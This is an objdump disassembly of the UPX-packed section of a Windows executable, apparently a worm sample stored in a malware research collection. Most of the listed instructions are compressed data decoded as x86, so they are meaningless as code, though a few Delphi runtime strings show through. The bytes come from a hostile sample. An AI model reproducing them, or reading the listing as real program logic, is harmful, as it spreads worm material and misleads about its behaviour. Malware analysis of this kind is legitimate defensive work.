
malware_samples/worm/4a589b62115bd62e62995e68e7f92da4011203ce52ab0f31092985a8136637bc.exe:     file format pei-i386


Disassembly of section UPX1:

00412000 <UPX1>:
  412000:	06                   	push   %es
  412001:	99                   	cltd
  412002:	fb                   	sti
  412003:	ff 04 10             	incl   (%eax,%edx,1)
  412006:	40                   	inc    %eax
  412007:	00 0a                	add    %cl,(%edx)
  412009:	06                   	push   %es
  41200a:	53                   	push   %ebx
  41200b:	74 72                	je     0x41207f
  41200d:	69 6e 67 58 0b 00 d3 	imul   $0xd3000b58,0x67(%esi),%ebp
  412014:	2d 07 fb 1f 04       	sub    $0x41ffb07,%eax
  412019:	0b d4                	or     %esp,%edx
  41201b:	2b e0                	sub    %eax,%esp
  41201d:	03 e4                	add    %esp,%esp
  41201f:	ae                   	scas   %es:(%edi),%al
  412020:	59                   	pop    %ecx
  412021:	36 4d                	ss dec %ebp
  412023:	e8 dc a4 2a b8       	call   0xb86bc504
  412028:	00 0b                	add    %cl,(%ebx)
  41202a:	65 c3                	gs ret
  41202c:	cc                   	int3
  41202d:	ff 07                	incl   (%edi)
  41202f:	54                   	push   %esp
  412030:	4f                   	dec    %edi
  412031:	62 6a 65             	bound  %ebp,0x65(%edx)
  412034:	63 74 64 10          	arpl   %esi,0x10(%esp,%eiz,2)
  412038:	0c 60                	or     $0x60,%al
  41203a:	fb                   	sti
  41203b:	df 2d ff 06 53 79    	fildll 0x795306ff
  412041:	73 74                	jae    0x4120b7
  412043:	65 6d                	gs insl (%dx),%es:(%edi)
  412045:	84 12                	test   %dl,(%edx)
  412047:	0f 08                	invd
  412049:	49                   	dec    %ecx
  41204a:	55                   	push   %ebp
  41204b:	6e                   	outsb  %ds:(%esi),(%dx)
  41204c:	6b 6e 6f 77          	imul   $0x77,0x6f(%esi),%ebp
  412050:	6e                   	outsb  %ds:(%esi),(%dx)
  412051:	6e                   	outsb  %ds:(%esi),(%dx)
  412052:	27                   	daa
  412053:	39 3b                	cmp    %edi,(%ebx)
  412055:	e4 01                	in     $0x1,%al
  412057:	c0 2b 46             	shrb   $0x46,(%ebx)
  41205a:	ff 25 83 0c b2 fd    	jmp    *0xfdb20c83
  412060:	54                   	push   %esp
  412061:	11 41 00             	adc    %eax,0x0(%ecx)
  412064:	8b c0                	mov    %eax,%eax
  412066:	07                   	pop    %es
  412067:	50                   	push   %eax
  412068:	4c                   	dec    %esp
  412069:	48                   	dec    %eax
  41206a:	0c 32                	or     $0x32,%al
  41206c:	c8 20 44 40          	enter  $0x4420,$0x40
  412070:	3c 32                	cmp    $0x32,%al
  412072:	c8 20 83 38          	enter  $0x8320,$0x38
  412076:	34 30                	xor    $0x30,%al
  412078:	c8 20 83 0c          	enter  $0x8320,$0xc
  41207c:	2c 28                	sub    $0x28,%al
  41207e:	24 20                	and    $0x20,%al
  412080:	83 0c 32 68          	orl    $0x68,(%edx,%esi,1)
  412084:	20 64 83 0c          	and    %ah,0xc(%ebx,%eax,4)
  412088:	32 c8                	xor    %al,%cl
  41208a:	1c 18                	sbb    $0x18,%al
  41208c:	14 10                	adc    $0x10,%al
  41208e:	0c 32                	or     $0x32,%al
  412090:	c8 20 0c 08          	enter  $0xc20,$0x8
  412094:	04 e4                	add    $0xe4,%al
  412096:	e4 20                	in     $0x20,%al
  412098:	83 00 fc             	addl   $0xfffffffc,(%eax)
  41209b:	10 f8                	adc    %bh,%al
  41209d:	c9                   	leave
  41209e:	41                   	inc    %ecx
  41209f:	06                   	push   %es
  4120a0:	19 f4                	sbb    %esi,%esp
  4120a2:	f0 60                	lock pusha
  4120a4:	11 06                	adc    %eax,(%esi)
  4120a6:	19 e4                	sbb    %esp,%esp
  4120a8:	e4 ec                	in     $0xec,%al
  4120aa:	10 e8                	adc    %ch,%al
  4120ac:	e4 e0                	in     $0xe0,%al
  4120ae:	32 c8                	xor    %al,%cl
  4120b0:	c9                   	leave
  4120b1:	41                   	inc    %ecx
  4120b2:	78 11                	js     0x4120c5
  4120b4:	74 70                	je     0x412126
  4120b6:	c9                   	leave
  4120b7:	41                   	inc    %ecx
  4120b8:	4e                   	dec    %esi
  4120b9:	0e                   	push   %cs
  4120ba:	dc 10                	fcoml  (%eax)
  4120bc:	d8 98 11 83 0c 32    	fcomps 0x320c8311(%eax)
  4120c2:	c8 94 90 8c          	enter  $0x9094,$0x8c
  4120c6:	88 3f                	mov    %bh,(%edi)
  4120c8:	32 c8                	xor    %al,%cl
  4120ca:	20 84 80 53 83 c4 bc 	and    %al,-0x433b7cad(%eax,%eax,4)
  4120d1:	bb ff 7f c3 86       	mov    $0x86c37fff,%ebx
  4120d6:	0a 7a 54             	or     0x54(%edx),%bh
  4120d9:	e8 8e 70 f6 44       	call   0x4537916c
  4120de:	24 2c                	and    $0x2c,%al
  4120e0:	01 74 05 0f          	add    %esi,0xf(%ebp,%eax,1)
  4120e4:	b7 5c                	mov    $0x5c,%bh
  4120e6:	24 30                	and    $0x30,%al
  4120e8:	8b c3                	mov    %ebx,%eax
  4120ea:	60                   	pusha
  4120eb:	83 7c 6f 1b 44       	cmpl   $0x44,0x1b(%edi,%ebp,2)
  4120f0:	5b                   	pop    %ebx
  4120f1:	c3                   	ret
  4120f2:	63 d4                	arpl   %edx,%esp
  4120f4:	d0 07                	rolb   $1,(%edi)
  4120f6:	83 0c 32 c8          	orl    $0xffffffc8,(%edx,%esi,1)
  4120fa:	cc                   	int3
  4120fb:	c8 c4 c0 3f          	enter  $0xc0c4,$0x3f
  4120ff:	32 c8                	xor    %al,%cl
  412101:	20 bc b8 53 56 be 4c 	and    %bh,0x4cbe5653(%eax,%edi,4)
  412108:	04 7f                	add    $0x7f,%al
  41210a:	73 f9                	jae    0x412105
  41210c:	6f                   	outsl  %ds:(%esi),(%dx)
  41210d:	6c                   	insb   (%dx),%es:(%edi)
  41210e:	83 3e 00             	cmpl   $0x0,(%esi)
  412111:	75 3a                	jne    0x41214d
  412113:	68 44 06 6a 00       	push   $0x6a0644
  412118:	02 34 8b             	add    (%ebx,%ecx,4),%dh
  41211b:	c8 85 c9 75          	enter  $0xc985,$0x75
  41211f:	ff f7                	push   %edi
  412121:	ee                   	out    %al,(%dx)
  412122:	f6 05 33 c0 5e 64 a1 	testb  $0xa1,0x645ec033
  412129:	48                   	dec    %eax
  41212a:	20 89 01 89 0d 07    	and    %cl,0x70d8901(%ecx)
  412130:	33 d2                	xor    %edx,%edx
  412132:	8b c2                	mov    %edx,%eax
  412134:	03 c0                	add    %eax,%eax
  412136:	8d b6 fb ff ff 44    	lea    0x44fffffb(%esi),%esi
  41213c:	c1 04 8b 1e          	roll   $0x1e,(%ebx,%ecx,4)
  412140:	89 18                	mov    %ebx,(%eax)
  412142:	89 06                	mov    %eax,(%esi)
  412144:	42                   	inc    %edx
  412145:	83 fa 64             	cmp    $0x64,%edx
  412148:	75 ec                	jne    0x412136
  41214a:	8b 06                	mov    (%esi),%eax
  41214c:	8b 10                	mov    (%eax),%edx
  41214e:	89 16                	mov    %edx,(%esi)
  412150:	2b 90 89 29 07 fb    	sub    -0x4f8d677(%eax),%edx
  412156:	fb                   	sti
  412157:	f7 40 04 c3 57 8b f2 	testl  $0xf28b57c3,0x4(%eax)
  41215e:	8b d8                	mov    %eax,%ebx
  412160:	4a                   	dec    %edx
  412161:	74 85                	je     0x4120e8
  412163:	c0 48 8b 16          	rorb   $0x16,-0x75(%eax)
  412167:	6d                   	insl   (%dx),%es:(%edi)
  412168:	db be fd 89 50 08    	fstpt  0x85089fd(%esi)
  41216e:	8b 56 04             	mov    0x4(%esi),%edx
  412171:	05 0c 8b 13 89       	add    $0x89138b0c,%eax
  412176:	30 58 09             	xor    %bl,0x9(%eax)
  412179:	42                   	inc    %edx
  41217a:	02 bd ed b7 ef 03    	add    0x3efb7ed(%ebp),%bh
  412180:	b0 01                	mov    $0x1,%al
  412182:	1b 50 50             	sbb    0x50(%eax),%edx
  412185:	08 89 0a 89 51 06    	or     %cl,0x651890a(%ecx)
  41218b:	15 90 ed ff db       	adc    $0xdbffed90,%eax
  412190:	b7 1e                	mov    $0x1e,%bh
  412192:	a3 06 c3 47 57       	mov    %eax,0x5747c306
  412197:	55                   	push   %ebp
  412198:	51                   	push   %ecx
  412199:	8b f1                	mov    %ecx,%esi
  41219b:	89 14 24             	mov    %edx,(%esp)
  41219e:	8b e8                	mov    %eax,%ebp
  4121a0:	8b 5d b0             	mov    -0x50(%ebp),%ebx
  4121a3:	bf 7d eb de 04       	mov    $0x4deeb7d,%edi
  4121a8:	24 69                	and    $0x69,%al
  4121aa:	2d 89 47 8b 3b       	sub    $0x3b8b4789,%eax
  4121af:	8b 43 4f             	mov    0x4f(%ebx),%eax
  4121b2:	d0 03                	rolb   $1,(%ebx)
  4121b4:	53                   	push   %ebx
  4121b5:	0c 3b                	or     $0x3b,%al
  4121b7:	5b                   	pop    %ebx
  4121b8:	73 5f                	jae    0x412219
  4121ba:	e1 16                	loope  0x4121d2
  4121bc:	75 14                	jne    0x4121d2
  4121be:	12 6d fc             	adc    -0x4(%ebp),%ch
  4121c1:	12 95 04 0c 4b f6    	adc    -0x9b4f3fc(%ebp),%dl
  4121c7:	ed                   	in     (%dx),%eax
  4121c8:	f6 01 46             	testb  $0x46,(%ecx)
  4121cb:	04 eb                	add    $0xeb,%al
  4121cd:	27                   	daa
  4121ce:	16                   	push   %ss
  4121cf:	03 26                	add    (%esi),%esp
  4121d1:	3b c2                	cmp    %edx,%eax
  4121d3:	75 0d                	jne    0x4121e2
  4121d5:	1c 17                	sbb    $0x17,%al
  4121d7:	95                   	xchg   %eax,%ebp
  4121d8:	e5 f7                	in     $0xf7,%eax
  4121da:	ff 8b df 3b eb 75    	decl   0x75eb3bdf(%ebx)
  4121e0:	c2 8b d6             	ret    $0xd68b
  4121e3:	8b c5                	mov    %ebp,%eax
  4121e5:	9f                   	lahf
  4121e6:	cc                   	int3
  4121e7:	84 04 0b             	test   %al,(%ebx,%ecx,1)
  4121ea:	af                   	scas   %es:(%edi),%eax
  4121eb:	d4 bd                	aam    $0xbd
  4121ed:	34 5a                	xor    $0x5a,%al
  4121ef:	5d                   	pop    %ebp
  4121f0:	5f                   	pop    %edi
  4121f1:	88 8d 07 73 5e f8    	mov    %cl,-0x7a18cf9(%ebp)
  4121f7:	bd fd bb 6f be       	mov    $0xbe6fbbfd,%ebp
  4121fc:	8b fb                	mov    %ebx,%edi
  4121fe:	8b 32                	mov    (%edx),%esi
  412200:	4f                   	dec    %edi
  412201:	3b f0                	cmp    %eax,%esi
  412203:	72 6c                	jb     0x412271
  412205:	8b ce                	mov    %esi,%ecx
  412207:	03 4a 38             	add    0x38(%edx),%ecx
  41220a:	e8 03 6b 36 b7       	call   0xb7778d12
  41220f:	bd bd 6b cd 77       	mov    $0x77cd6bbd,%ebp
  412214:	5e                   	pop    %esi
  412215:	11 75 1b             	adc    %esi,0x1b(%ebp)
  412218:	8b bb 01 7e 05 29    	mov    0x29057e01(%ebx),%edi
  41221e:	b7 c1                	mov    $0xc1,%bh
  412220:	16                   	push   %ss
  412221:	de 54 83 7b          	ficoms 0x7b(%ebx,%eax,4)
  412225:	0c 3f                	or     $0x3f,%al
  412227:	44                   	inc    %esp
  412228:	64 eb 96             	fs jmp 0x4121c1
  41222b:	0a 8b 6b bf dd fe    	or     -0x1224095(%ebx),%cl
  412231:	72 04                	jb     0x412237
  412233:	03 ce                	add    %esi,%ecx
  412235:	8b f8                	mov    %eax,%edi
  412237:	03 17                	add    (%edi),%edx
  412239:	3b cf                	cmp    %edi,%ecx
  41223b:	fd                   	std
  41223c:	29 73 0c             	sub    %esi,0xc(%ebx)
  41223f:	eb 26                	jmp    0x412267
  412241:	14 41                	adc    $0x41,%al
  412243:	de ed                	fsubrp %st,%st(5)
  412245:	db bf 89 0c 24 2b    	fstpt  0x2b240c89(%edi)
  41224b:	f9                   	stc
  41224c:	89 7c 24 4a          	mov    %edi,0x4a(%esp)
  412250:	12 2b                	adc    (%ebx),%ch
  412252:	d0 89 b8 8b d4 34    	rorb   $1,0x34d48bb8(%ecx)
  412258:	f6 db                	neg    %bl
  41225a:	c2 c9 84             	ret    $0x84c9
  41225d:	eb 0c                	jmp    0x41226b
  41225f:	0c eb                	or     $0xeb,%al
  412261:	53                   	push   %ebx
  412262:	1b 3b                	sbb    (%ebx),%edi
  412264:	fb                   	sti
  412265:	75 85                	jne    0x4121ec
  412267:	0d 7e fb dd d9       	or     $0xd9ddfb7e,%eax
  41226c:	59                   	pop    %ecx
  41226d:	91                   	xchg   %eax,%ecx
  41226e:	90                   	nop
  41226f:	8f                   	(bad)
  412270:	8b da                	mov    %edx,%ebx
  412272:	8b f0                	mov    %eax,%esi
  412274:	81 fe 28 10 00 7d    	cmp    $0x7d001028,%esi
  41227a:	07                   	pop    %es
  41227b:	be df 74 fb f6       	mov    $0xf6fb74df,%esi
  412280:	06                   	push   %es
  412281:	29 81 c6 ff ff 09    	sub    %eax,0x9ffffc6(%ecx)
  412287:	81 e6 8f ff 89 73    	and    $0x7389ff8f,%esi
  41228d:	04 6a                	add    $0x6a,%al
  41228f:	ff 6d c2             	ljmp   *-0x3e(%ebp)
  412292:	f6 01 68             	testb  $0x68,(%ecx)
  412295:	00 20                	add    %ah,(%eax)
  412297:	0b 56 bf             	or     -0x41(%esi),%edx
  41229a:	8b f8                	mov    %eax,%edi
  41229c:	89 3b                	mov    %edi,(%ebx)
  41229e:	85 ff                	test   %edi,%edi
  4122a0:	74 23                	je     0x4122c5
  4122a2:	8b c3                	mov    %ebx,%eax
  4122a4:	76 98                	jbe    0x41223e
  4122a6:	e1 d3                	loope  0x41227b
  4122a8:	b8 50 47 63 13       	mov    $0x13634750,%eax
  4122ad:	24 80                	and    $0x80,%al
  4122af:	e3 f0                	jecxz  0x4122a1
  4122b1:	61                   	popa
  4122b2:	dd f7                	(bad)
  4122b4:	8b 03                	mov    (%ebx),%eax
  4122b6:	50                   	push   %eax
  4122b7:	12 4c f7 03          	adc    0x3(%edi,%esi,8),%cl
  4122bb:	63 55 8b             	arpl   %edx,-0x75(%ebp)
  4122be:	d9 f6                	fdecstp
  4122c0:	8d                   	lea    (bad),%edi
  4122c1:	fd                   	std
  4122c2:	de b3 e8 c7 43 04    	fidivs 0x443c7e8(%ebx)
  4122c8:	60                   	pusha
  4122c9:	6a 04                	push   $0x4
  4122cb:	4f                   	dec    %edi
  4122cc:	68 0b 55 52 36       	push   $0x3652550b
  4122d1:	39 b2 03 75 1f 78    	cmp    %esi,0x781f7503(%edx)
  4122d7:	04 24                	add    $0x24,%al
  4122d9:	59                   	pop    %ecx
  4122da:	02 ec                	add    %ah,%ch
  4122dc:	6d                   	insl   (%dx),%es:(%edi)
  4122dd:	4e                   	dec    %esi
  4122de:	83 3b 00             	cmpl   $0x0,(%ebx)
  4122e1:	76 db                	jbe    0x4122be
  4122e3:	d1 50 b8             	rcll   $1,-0x48(%eax)
  4122e6:	21 6b ec             	and    %ebp,-0x14(%ebx)
  4122e9:	89 4c 12 e3          	mov    %ecx,-0x1d(%edx,%edx,1)
  4122ed:	c7 43 fb 86 bb e2 08 	movl   $0x8e2bb86,-0x5(%ebx)
  4122f4:	ff 00                	incl   (%eax)
  4122f6:	65 89 54 24 0c       	mov    %edx,%gs:0xc(%esp)
  4122fb:	8b ee                	mov    %esi,%ebp
  4122fd:	85 c6                	test   %eax,%esi
  4122ff:	f7 76 03             	divl   0x3(%esi)
  412302:	c5 89 14 10 8b 1d    	lds    0x1d8b1014(%ecx),%ecx
  412308:	4e                   	dec    %esi
  412309:	eb 09                	jmp    0x412314
  41230b:	5b                   	pop    %ebx
  41230c:	6b ef ca             	imul   $0xffffffca,%edi,%ebp
  41230f:	ff 73 08             	push   0x8(%ebx)
  412312:	3b ee                	cmp    %esi,%ebp
  412314:	77 46                	ja     0x41235c
  412316:	8b c6                	mov    %esi,%eax
  412318:	03 43 19             	add    0x19(%ebx),%eax
  41231b:	77 3b                	ja     0x412358
  41231d:	3b 74 34 86          	cmp    -0x7a(%esp,%esi,1),%esi
  412321:	73 ed                	jae    0x412310
  412323:	61                   	popa
  412324:	6e                   	outsb  %ds:(%esi),(%dx)
  412325:	89 05 14 0c 76 0e    	mov    %eax,0xe760c14
  41232b:	05 74 72 6f 3e       	add    $0x3e6f7274,%eax
  412330:	06                   	push   %es
  412331:	56                   	push   %esi
  412332:	85 4c 0a c7          	test   %ecx,-0x39(%edx,%ecx,1)
  412336:	05 2c 45 db df       	add    $0xdfdb452c,%eax
  41233b:	87 f1                	xchg   %esi,%ecx
  41233d:	d8 0f                	fmuls  (%edi)
  41233f:	df 81 fb 58 75 a7    	filds  -0x588aa705(%ecx)
  412345:	8b 2f                	mov    (%edi),%ebp
  412347:	04 b4                	add    $0xb4,%al
  412349:	6f                   	outsl  %ds:(%esi),(%dx)
  41234a:	6b 77 75 10          	imul   $0x10,0x75(%edi),%esi
  41234e:	83 7c 37 bf 19       	cmpl   $0x19,-0x41(%edi,%esi,1)
  412353:	0e                   	push   %cs
  412354:	8b 82 87 73 5d 6b    	mov    0x6b5d7387(%edx),%eax
  41235a:	4a                   	dec    %edx
  41235b:	79 48                	jns    0x4123a5
  41235d:	2b 96 0d ae 82 9c    	sub    -0x637d51f3(%esi),%edx
  412363:	c5 b6 ab 14 b8 b7    	lds    -0x4847eb55(%esi),%esi
  412369:	f4                   	hlt
  41236a:	e1 db                	loope  0x412347
  41236c:	f6 37                	divb   (%edi)
  41236e:	84 8b ea 81 e5 00    	test   %cl,0xe581ea(%ebx)
  412374:	f0 b9 03 0c 81 c2    	lock mov $0xc2810c03,%ecx
  41237a:	ff 0f                	decl   (%edi)
  41237c:	1f                   	pop    %ds
  41237d:	bb 66 73 af e2       	mov    $0xe2af7366,%ebx
  412382:	0e                   	push   %cs
  412383:	c6                   	(bad)
  412384:	39 44 28 05          	cmp    %eax,0x5(%eax,%ebp,1)
  412388:	08 2b                	or     %ch,(%ebx)
  41238a:	be 3d 76 b0 c5       	mov    $0xc5b0763d,%esi
  41238f:	45                   	inc    %ebp
  412390:	8b 35 ce 3c 8b 5e    	mov    0x5e8b3cce,%esi
  412396:	1d 7e 0c 03 fb       	sbb    $0xfb030c7e,%eax
  41239b:	e0 b6                	loopne 0x412353
  41239d:	ed                   	in     (%dx),%eax
  41239e:	37                   	aaa
  41239f:	8f                   	(bad)
  4123a0:	76 02                	jbe    0x4123a4
  4123a2:	8b dd                	mov    %ebp,%ebx
  4123a4:	3b 7b 08             	cmp    0x8(%ebx),%edi
  4123a7:	b9 8b 05 be 1b       	mov    $0x1bbe058b,%ecx
  4123ac:	78 b8                	js     0x412366
  4123ae:	ff 76 1e             	push   0x1e(%esi)
  4123b1:	57                   	push   %edi
  4123b2:	10 c3                	adc    %al,%bl
  4123b4:	fb                   	sti
  4123b5:	57                   	push   %edi
  4123b6:	53                   	push   %ebx
  4123b7:	c0 44 ac b1 1d       	rolb   $0x1d,-0x4f(%esp,%ebp,4)
  4123bc:	76 a5                	jbe    0x412363
  4123be:	eb 09                	jmp    0x4123c9
  4123c0:	36 0e                	ss push %cs
  4123c2:	b9 71 3a 9d 6d       	mov    $0x6d9d3a71,%ecx
  4123c7:	bc 91 0c 73 2b       	mov    $0x2b730c91,%esp
  4123cc:	b7 91                	mov    $0x91,%bh
  4123ce:	cf                   	iret
  4123cf:	d0 b5 f3 a1 81 e6    	shlb   $1,-0x197e5e0d(%ebp)
  4123d5:	34 9d                	xor    $0x9d,%al
  4123d7:	eb 03                	jmp    0x4123dc
  4123d9:	36 4a                	ss dec %edx
  4123db:	86 20                	xchg   %ah,(%eax)
  4123dd:	4f                   	dec    %edi
  4123de:	c8 f6 2b fb          	enter  $0x2bf6,$0xfb
  4123e2:	49                   	dec    %ecx
  4123e3:	0e                   	push   %cs
  4123e4:	eb 06                	jmp    0x4123ec
  4123e6:	41                   	inc    %ecx
  4123e7:	84 38                	test   %bh,(%eax)
  4123e9:	1c 24                	sbb    $0x24,%al
  4123eb:	73 03                	jae    0x4123f0
  4123ed:	8b 04 4c             	mov    (%esp,%ecx,2),%eax
  4123f0:	b6 6e                	mov    $0x6e,%dh
  4123f2:	7b 3b                	jnp    0x41242f
  4123f4:	ef                   	out    %eax,(%dx)
  4123f5:	73 8c                	jae    0x412383
  4123f7:	fd                   	std
  4123f8:	82 1c 80 40          	sbbb   $0x40,(%eax,%eax,4)
  4123fc:	e9 b0 33 24 41       	jmp    0x416557b1
  412401:	02 80 c0 37 ee dd    	add    -0x2211c840(%eax),%al
  412407:	1b 29                	sbb    (%ecx),%ebp
  412409:	44                   	inc    %esp
  41240a:	f8                   	clc
  41240b:	bd 60 1a 81 c7       	mov    $0xc7811a60,%ebp
  412410:	ff                   	(bad)
  412411:	3f                   	aas
  412412:	86 97 6e 5d 83 e7    	xchg   %dl,-0x187ca292(%edi)
  412418:	41                   	inc    %ecx
  412419:	79 5d                	jns    0x412478
  41241b:	69 33 3b 0e 7f 2c    	imul   $0x2c7f0e3b,(%ebx),%esi
  412421:	bb 76 a6 4b 49       	mov    $0x494ba676,%ebx
  412426:	8b d7                	mov    %edi,%edx
  412428:	54                   	push   %esp
  412429:	52                   	push   %edx
  41242a:	05 ac 76 74 50       	add    $0x507476ac,%eax
  41242f:	87 4c 32 d2          	xchg   %ecx,-0x2e(%edx,%esi,1)
  412433:	8b 46 48             	mov    0x48(%esi),%eax
  412436:	46                   	inc    %esi
  412437:	3e 35 9f 5d d3 4d    	ds xor $0x4dd35d9f,%eax
  41243d:	09 dd                	or     %ebx,%ebp
  41243f:	75 c9                	jne    0x41240a
  412441:	a9 c7 2e 04 18       	test   $0x18042ec7,%eax
  412446:	21 8b b7 bd 10 a4    	and    %ecx,-0x5bef4249(%ebx)
  41244c:	cc                   	int3
  41244d:	b9 6a 83 3c 24       	mov    $0x243c836a,%ecx
  412452:	2d a5 10 26 9d       	sub    $0x9d2610a5,%eax
  412457:	be 2e 0b 06 21       	mov    $0x21060b2e,%esi
  41245c:	f4                   	hlt
  41245d:	c7                   	(bad)
  41245e:	36 4a                	ss dec %edx
  412460:	9b                   	fwait
  412461:	1e                   	push   %ds
  412462:	13 0f                	adc    (%edi),%ecx
  412464:	5b                   	pop    %ebx
  412465:	73 8b                	jae    0x4123f2
  412467:	fa                   	cli
  412468:	3e b1 c0             	ds mov $0xc0,%cl
  41246b:	9b                   	fwait
  41246c:	c0 92 02 61 53 3b 86 	rclb   $0x86,0x3b536102(%edx)
  412473:	ee                   	out    %al,(%dx)
  412474:	ee                   	out    %al,(%dx)
  412475:	bb 54 75 f5 04       	mov    $0x4f57554,%ebx
  41247a:	57                   	push   %edi
  41247b:	a2 0f 8e 96 df       	mov    %al,0xdf968e0f
  412480:	8d                   	lea    (bad),%ebx
  412481:	d9 3e                	fnstcw (%esi)
  412483:	47                   	inc    %edi
  412484:	33 6d a8             	xor    -0x58(%ebp),%ebp
  412487:	2b a2 9b 55 5d 7c    	sub    0x7c5d559b(%edx),%esp
  41248d:	cc                   	int3
  41248e:	b0 5b                	mov    $0x5b,%al
  412490:	3a 1c 04             	cmp    (%esp,%eax,1),%bl
  412493:	33 1a                	xor    (%edx),%ebx
  412495:	0c 8d                	or     $0x8d,%al
  412497:	c8 85 05 e1          	enter  $0x585,$0xe1
  41249b:	fb                   	sti
  41249c:	31 32                	xor    %esi,(%edx)
  41249e:	75 b1                	jne    0x412451
  4124a0:	15 8b ee ec f6       	adc    $0xf6ecee8b,%eax
  4124a5:	60                   	pusha
  4124a6:	88 8b 6c ab e9 0b    	mov    %cl,0xbe9ab6c(%ebx)
  4124ac:	08 6b 4d             	or     %ch,0x4d(%ebx)
  4124af:	00 19                	add    %bl,(%ecx)
  4124b1:	b0 c6                	mov    $0xc6,%al
  4124b3:	9f                   	lahf
  4124b4:	46                   	inc    %esi
  4124b5:	34 f8                	xor    $0xf8,%al
  4124b7:	11 e6                	adc    %esp,%esi
  4124b9:	f8                   	clc
  4124ba:	0f 85 66 fe 4a eb    	jne    0xeb8c2326
  4124c0:	48                   	dec    %eax
  4124c1:	8b 6b 57             	mov    0x57(%ebx),%ebp
  4124c4:	38 14 d8             	cmp    %dl,(%eax,%ebx,8)
  4124c7:	1b f5                	sbb    %ebp,%esi
  4124c9:	a9 48 1c d7 60       	test   $0x60d71c48,%eax
  4124ce:	db 19                	fistpl (%ecx)
  4124d0:	5e                   	pop    %esi
  4124d1:	d7                   	xlat   %ds:(%ebx)
  4124d2:	3c 48                	cmp    $0x48,%al
  4124d4:	20 83 38 53 28 26    	and    %al,0x26285338(%ebx)
  4124da:	e1 45                	loope  0x412521
  4124dc:	78 1f                	js     0x4124fd
  4124de:	40                   	inc    %eax
  4124df:	4e                   	dec    %esi
  4124e0:	08 51 10             	or     %dl,0x10(%ecx)
  4124e3:	1a 46 b0             	sbb    -0x50(%esi),%al
  4124e6:	43                   	inc    %ebx
  4124e7:	07                   	pop    %es
  4124e8:	49                   	dec    %ecx
  4124e9:	c6                   	(bad)
  4124ea:	23 ec                	and    %esp,%ebp
  4124ec:	d8 70 7f             	fdivs  0x7f(%eax)
  4124ef:	22 8b f9 c4 8d 98    	and    -0x67723b07(%ebx),%cl
  4124f5:	1b e3                	sbb    %ebx,%esp
  4124f7:	ff b6 36 22 35 03    	push   0x3352236(%esi)
  4124fd:	70 e6                	jo     0x4124e5
  4124ff:	0a 3b                	or     (%ebx),%bh
  412501:	de 73 5b             	fidivs 0x5b(%ebx)
  412504:	70 76                	jo     0x41257c
  412506:	ec                   	in     (%dx),%al
  412507:	c2 8b cf             	ret    $0xcf8b
  41250a:	73 2b                	jae    0x412537
  41250c:	d3 44 06 40          	roll   %cl,0x40(%esi,%eax,1)
  412510:	cb                   	lret
  412511:	b8 26 fb 76 ec       	mov    $0xec76fb26,%eax
  412516:	4e                   	dec    %esi
  412517:	b8 8b 5c 0f 85       	mov    $0x850f5c8b,%eax
  41251c:	db 74 1f b5          	(bad) -0x4b(%edi,%ebx,1)
  412520:	c3                   	ret
  412521:	9a ce 35 cd b3 38 89 	lcall  $0x8938,$0xb3cd35ce
  412528:	c0 07 10             	rolb   $0x10,(%edi)
  41252b:	08 07                	or     %al,(%edi)
  41252d:	4e                   	dec    %esi
  41252e:	f6 ce f5             	test   $0xf5,%dh
  412531:	14 f1                	adc    $0xf1,%al
  412533:	3b 88 eb 79 f1 6d    	cmp    0x6df179eb(%eax),%ecx
  412539:	eb b9                	jmp    0x4124f4
  41253b:	07                   	pop    %es
  41253c:	8d 8c 80 ec 9b 55 68 	lea    0x68559bec(%eax,%eax,4),%ecx
  412543:	ba 19 b6 07 eb       	mov    $0xeb07b619,%edx
  412548:	bf 4a 64 ff 32       	mov    $0x32ff644a,%edi
  41254d:	64 89 22             	mov    %esp,%fs:(%edx)
  412550:	68 30 43 54 80       	push   $0x80544330
  412555:	3d 08 41 36 59       	cmp    $0x59364108,%eax
  41255a:	93                   	xchg   %eax,%ebx
  41255b:	5d                   	pop    %ebp
  41255c:	74 0a                	je     0x412568
  41255e:	12 5c 60 c4          	adc    -0x3c(%eax,%eiz,2),%bl
  412562:	4e                   	dec    %esi
  412563:	0c 3e                	or     $0x3e,%al
  412565:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  412566:	1b 09                	sbb    (%ecx),%ecx
  412568:	8c 68 f8             	mov    %gs,-0x8(%eax)
  41256b:	0f cb                	bswap  %ebx
  41256d:	78 7b                	js     0x4125ea
  41256f:	1f                   	pop    %ds
  412570:	9c                   	pushf
  412571:	a3 88 e1 3d 05       	mov    %eax,0x53de188
  412576:	41                   	inc    %ecx
  412577:	2f                   	das
  412578:	b8 03 5c bf f4       	mov    $0xf4bf5c03,%eax
  41257d:	fb                   	sti
  41257e:	bd 15 0d 33 c9       	mov    $0xc9330d15,%ebp
  412583:	bf 82 f4 40 3d       	mov    $0x3d40f482,%edi
  412588:	01 f1                	add    %esi,%ecx
  41258a:	06                   	push   %es
  41258b:	0e                   	push   %cs
  41258c:	dc 0d c4 b8 70 12    	fmull  0x1270b8c4
  412592:	bd c2 db db eb       	mov    $0xebdbdbc2,%ebp
  412597:	ee                   	out    %al,(%dx)
  412598:	a3 7c 09 c6 05       	mov    %eax,0x5c6097c
  41259d:	28 2c 9f             	sub    %ch,(%edi,%ebx,4)
  4125a0:	5a                   	pop    %edx
  4125a1:	59                   	pop    %ecx
  4125a2:	59                   	pop    %ecx
  4125a3:	8b 10                	mov    (%eax),%edx
  4125a5:	df f0                	fcomip %st(0),%st
  4125a7:	ca dc 68             	lret   $0x68dc
  4125aa:	c1 96 86 64 c3 df 1e 	rcll   $0x1e,-0x203c9b7a(%esi)
  4125b1:	90                   	nop
  4125b2:	eb e5                	jmp    0x412599
  4125b4:	a0 2e bc f6 7d       	mov    0x7df6bc2e,%al
  4125b9:	2d 5d c3 53 25       	sub    $0x2553c35d,%eax
  4125be:	0b cb                	or     %ebx,%ecx
  4125c0:	84 cc                	test   %cl,%ah
  4125c2:	00 36                	add    %dh,(%esi)
  4125c4:	e4 e7                	in     $0xe7,%al
  4125c6:	69 d1 9e 1a c7 65    	imul   $0x65c71a9e,%ecx,%edx
  4125cc:	04 de                	add    $0xde,%al
  4125ce:	b3 67                	mov    $0x67,%bl
  4125d0:	00 a1 90 1d 3c 04    	add    %ah,0x43c1d90(%ecx)
  4125d6:	6b b0 62 b1 f3 12 c6 	imul   $0xffffffc6,0x12f3b162(%eax),%esi
  4125dd:	b0 1a                	mov    $0x1a,%al
  4125df:	13 70 87             	adc    -0x79(%eax),%esi
  4125e2:	3c b2                	cmp    $0xb2,%al
  4125e4:	b4 8a                	mov    $0x8a,%ah
  4125e6:	c4 22                	les    (%edx),%esp
  4125e8:	61                   	popa
